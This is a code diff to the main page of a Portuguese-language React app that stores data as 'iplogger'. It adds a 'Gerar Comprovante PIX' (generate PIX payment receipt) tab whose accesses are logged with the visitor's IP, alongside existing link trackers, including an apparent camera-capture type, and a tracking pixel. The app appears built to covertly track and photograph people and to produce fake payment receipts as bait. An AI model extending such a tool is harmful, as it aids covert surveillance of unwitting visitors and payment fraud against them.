@@ -3,11 +3,12 @@ import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
 import { Separator } from '@/components/ui/separator';
-import { Copy, Link, Eye, Smartphone, Globe, Clock, Monitor } from 'lucide-react';
+import { Copy, Link, Eye, Smartphone, Globe, Clock, Monitor, Receipt } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 import LinkGenerator from '@/components/LinkGenerator';
 import AccessViewer from '@/components/AccessViewer';
 import PixelTracker from '@/components/PixelTracker';
+import ReceiptGenerator from '@/components/ReceiptGenerator';
 
 interface AccessData {
   id: string;
@@ -15,14 +16,15 @@ interface AccessData {
   ip: string;
   userAgent: string;
   referrer: string;
-  type: 'link' | 'pixel';
+  type: 'link' | 'pixel' | 'receipt';
   linkId?: string;
   linkType?: 'ip' | 'camera';
   photo?: string;
+  receiptId?: string;
 }
 
 const Index = () => {
-  const [activeTab, setActiveTab] = useState<'home' | 'generate' | 'view'>('home');
+  const [activeTab, setActiveTab] = useState<'home' | 'generate' | 'view' | 'receipt'>('home');
   const [accessData, setAccessData] = useState<AccessData[]>([]);
   const { toast } = useToast();
 
@@ -41,6 +43,7 @@ const Index = () => {
   const clearData = () => {
     localStorage.removeItem('iplogger-data');
     localStorage.removeItem('iplogger-links');
+    localStorage.removeItem('iplogger-receipts');
     setAccessData([]);
     toast({
       title: "Dados Limpos",
@@ -71,6 +74,16 @@ const Index = () => {
     return (
       <div className="min-h-screen bg-gray-900 text-white">
         <LinkGenerator 
+          onBack={() => setActiveTab('home')} 
+        />
+      </div>
+    );
+  }
+
+  if (activeTab === 'receipt') {
+    return (
+      <div className="min-h-screen bg-gray-900 text-white">
+        <ReceiptGenerator 
           onBack={() => setActiveTab('home')} 
         />
       </div>
@@ -137,6 +150,15 @@ const Index = () => {
           </Button>
 
           <Button 
+            onClick={() => setActiveTab('receipt')}
+            className="w-full bg-green-600 hover:bg-green-700 text-white py-6"
+            size="lg"
+          >
+            <Receipt className="mr-2 h-5 w-5" />
+            Gerar Comprovante PIX
+          </Button>
+
+          <Button 
             onClick={() => setActiveTab('view')}
             className="w-full bg-purple-600 hover:bg-purple-700 text-white py-6"
             size="lg"
@@ -167,7 +189,7 @@ const Index = () => {
                     <div className="flex items-center space-x-2">
                       <Monitor className="h-4 w-4 text-gray-400" />
                       <span className="text-gray-300">
-                        {access.type === 'pixel' ? 'Pixel' : 'Link'} - {access.ip}
+                        {access.type === 'pixel' ? 'Pixel' : access.type === 'receipt' ? 'Comprovante' : 'Link'} - {access.ip}
                       </span>
                     </div>
                     <span className="text-gray-500">
